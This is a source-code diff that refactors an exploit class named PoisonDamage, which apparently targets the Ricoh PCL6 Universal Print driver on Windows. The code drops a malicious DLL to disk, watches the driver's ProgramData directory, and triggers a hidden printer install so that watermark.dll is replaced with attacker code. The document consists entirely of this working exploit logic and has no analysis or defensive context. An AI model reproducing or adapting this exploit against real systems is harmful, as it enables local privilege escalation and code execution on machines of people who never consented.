@@ -74,7 +74,7 @@ namespace
     }
 
     void HandleDirectoryChange(HANDLE dwCompletionPort, const WCHAR* p_target)
-    {    
+    {
         int change_counter = 100;
         LPDIRECTORY_INFO di = NULL;
 
@@ -115,50 +115,18 @@ namespace
                         }
                     } // eo action mod
                     fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);
-                }
-                while (cbOffset);
+                } while (cbOffset);
 
                 // Reissue the watch command
                 ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
             }
-        }
-        while (di);
-    }
-
-    bool installPrinter(const std::string& p_driver)
-    {
-        std::cout << "[+] Installing printer" << std::endl;
-
-        std::wstring wdriver(p_driver.begin(), p_driver.end());
-
-        // install printer
-        PRINTER_INFO_2 printerInfo = { };
-        ZeroMemory(&printerInfo, sizeof(printerInfo));
-        printerInfo.pPortName = (LPWSTR)L"lpt1:";
-        printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
-        printerInfo.pPrinterName = (LPWSTR)L"POISONDAMAGE";
-        printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
-        printerInfo.pDatatype = (LPWSTR)L"RAW";
-        printerInfo.pComment = (LPWSTR)L"Poison Damage";
-        printerInfo.pLocation = (LPWSTR)L"Feywild";
-        printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
-        printerInfo.AveragePPM = 9001;
-        HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
-        if (hPrinter == 0)
-        {
-            std::cerr << "[-] Failed to create printer: " << GetLastError() << std::endl;
-            return false;
-        }
-
-        DeletePrinter(hPrinter);
-        ClosePrinter(hPrinter);
-        return true;
+        } while (di);
     }
 }
 
 PoisonDamage::PoisonDamage() :
-    Exploit("PCL6 Driver for Universal Print"),
-    m_target_directory("C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll"),
+    Exploit("PCL6 Driver for Universal Print", "PoisonDamage"),
+    m_target_directory("C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\"),
     m_target_dll("watermark.dll"),
     m_malicious_dll("Dll.dll")
 {
@@ -170,18 +138,15 @@ PoisonDamage::~PoisonDamage()
 
 bool PoisonDamage::do_exploit()
 {
-    std::cout << "[+] Dropping " << m_malicious_dll << " to disk" << std::endl;
-    std::ofstream dll_out(m_malicious_dll, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
-    if (!dll_out.is_open())
+    if (!drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
     {
-        std::cerr << "[!] Couldn't write the dll to disk." << std::endl;
+        return false;
     }
-    for (unsigned int i = 0; i < inject_me_dll_len; i++)
+
+    if (!initialize_attack_space(m_target_directory))
     {
-        dll_out << inject_me_dll[i];
+        return false;
     }
-    dll_out.flush();
-    dll_out.close();
 
     const WCHAR* target_path = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
 
@@ -201,7 +166,10 @@ bool PoisonDamage::do_exploit()
 
         // start the watcher thread and trigger installation
         std::thread watch(HandleDirectoryChange, hCompPort, target_path);
-        installPrinter(m_driverName);
+        if (!install_printer())
+        {
+            return false;
+        }
         watch.join();
 
         // monitor cleanup
